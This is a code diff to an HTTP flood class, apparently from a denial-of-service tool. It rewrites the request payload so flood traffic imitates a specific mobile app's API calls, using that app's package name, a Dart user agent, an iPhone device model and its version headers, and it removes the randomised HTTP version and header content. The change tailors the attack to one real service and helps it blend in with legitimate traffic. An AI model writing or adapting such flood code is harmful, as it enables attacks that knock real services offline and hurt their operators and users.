@@ -627,20 +627,28 @@ class HttpFlood(Thread):
             ]
         self._useragents = list(useragents)
         self._req_type = self.getMethodType(method)
-        self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
-                                                      target.raw_path_qs, randchoice(['1.0', '1.1', '1.2']))
+        self._defaultpayload = "%s %s HTTP/1.1\r\n" % (self._req_type,
+                                                      target.raw_path_qs)
         self._payload = (self._defaultpayload +
-                         'Accept-Encoding: gzip, deflate, br\r\n'
-                         'Accept-Language: en-US,en;q=0.9\r\n'
-                         'Cache-Control: max-age=0\r\n'
-                         'Connection: keep-alive\r\n'
-                         'Sec-Fetch-Dest: document\r\n'
-                         'Sec-Fetch-Mode: navigate\r\n'
-                         'Sec-Fetch-Site: none\r\n'
-                         'Sec-Fetch-User: ?1\r\n'
-                         'Sec-Gpc: 1\r\n'
-                         'Pragma: no-cache\r\n'
-                         'Upgrade-Insecure-Requests: 1\r\n')
+                         'community-tab-index: 0\r\n'
+                         'user-agent: Dart/2.19 (dart:io)\r\n'
+                         'x-api-token: \r\n'
+                         'select-language: \r\n'
+                         'version: 1.0.8\r\n'
+                         'os-ver: 16.6\r\n'
+                         'connection: Keep-Alive\r\n'
+                         'community-translate-type: true\r\n'
+                         'accept-language: en-CN\r\n'
+                         'build-mode: release\r\n'
+                         'app-ver: 1.0.8\r\n'
+                         'device-model: iPhone15,3\r\n'
+                         'package: com.contentsmadang.fancast\r\n'
+                         'brightness: dark\r\n'
+                         'content-type: application/json\r\n'
+                         'community-display-type: list\r\n'
+                         'accept-encoding: gzip\r\n'
+                         'system-language: zh-CN\r\n'
+                         'device: 2\r\n')
 
     def run(self) -> None:
         if self._synevent: self._synevent.wait()
@@ -660,8 +668,7 @@ class HttpFlood(Thread):
 
     def generate_payload(self, other: str = None) -> bytes:
         return str.encode((self._payload +
-                           "Host: %s\r\n" % self._target.authority +
-                           self.randHeadercontent +
+                           f"Host: {self._target.authority}\r\n" +
                            (other if other else "") +
                            "\r\n"))
 
